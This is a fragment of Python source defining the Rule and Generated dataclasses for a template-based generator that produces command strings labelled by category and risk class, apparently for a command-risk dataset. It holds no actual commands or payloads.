# Rules
# ---------------------------------------------------------------------------


@dataclass(frozen=True, slots=True)
class Rule:
    """One combinatorial template.

    Attributes:
        category: key into ``labels.CATEGORIES``; supplies the risk class.
        template: format string with ``{slot}`` placeholders.
        slots: placeholder name to alternatives. The rendered set is the
            cartesian product, truncated to ``limit`` deterministically.
        limit: cap on rendered commands. Without a cap, wide slot lists
            multiply into tens of thousands of near-identical rows, which helps
            nothing and distorts the class balance.
        risk_override: for the handful of shapes whose danger depends on a slot
            rather than on the category alone.
    """

    category: str
    template: str
    slots: Mapping[str, Sequence[str]] = field(default_factory=dict)
    limit: int = 400

    @property
    def risk(self) -> Risk:
        return label_for_category(self.category)


@dataclass(frozen=True, slots=True)
class Generated:
    """One generated row, before augmentation."""

    command: str
    category: str
    risk: Risk
    source: str = "grammar"


